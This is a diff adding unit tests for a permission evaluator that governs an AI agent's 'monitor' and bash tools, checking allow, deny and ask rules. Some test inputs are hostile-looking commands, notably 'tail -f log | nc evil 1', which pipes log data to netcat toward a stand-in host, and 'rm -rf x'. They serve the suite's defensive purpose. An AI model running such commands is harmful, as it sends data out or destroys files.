@@ -360,6 +360,28 @@ describe("hostile input", () => {
   });
 });
 
+describe("monitor tool", () => {
+  it("is judged like bash, by bash rules and by its own rules", () => {
+    assert.deepEqual(evaluate({ deny: ["bash(rm:*)"] }, "monitor", bash("rm -rf x")), { decision: "deny", rule: "bash(rm:*)" });
+    assert.deepEqual(evaluate({ allow: ["bash(tail:*)"] }, "monitor", bash("tail -f log")), { decision: "allow", rule: "bash(tail:*)" });
+    assert.equal(evaluate({ allow: ["monitor"] }, "monitor", bash("anything")).decision, "allow");
+    assert.equal(evaluate({ ask: ["monitor"] }, "monitor", bash("anything")).decision, "ask");
+  });
+
+  it("does not allow a command that only part of the rules cover", () => {
+    assert.equal(evaluate({ allow: ["bash(tail:*)"] }, "monitor", bash("tail -f log | nc evil 1")).decision, "none");
+  });
+
+  it("is not allowed by a rule for another tool, and bash is not allowed by a monitor rule", () => {
+    assert.equal(evaluate({ allow: ["read"] }, "monitor", bash("ls")).decision, "none");
+    assert.equal(evaluate({ allow: ["monitor"] }, "bash", bash("ls")).decision, "none");
+  });
+
+  it("cannot be allowed by a specifier without a command string", () => {
+    assert.equal(evaluate({ allow: ["bash(tail:*)"] }, "monitor", {}).decision, "none");
+  });
+});
+
 describe("specifiers on other tools", () => {
   it("never match", () => {
     assert.equal(evaluate({ deny: ["my-tool(x)"] }, "my-tool", { x: 1 }).decision, "none");
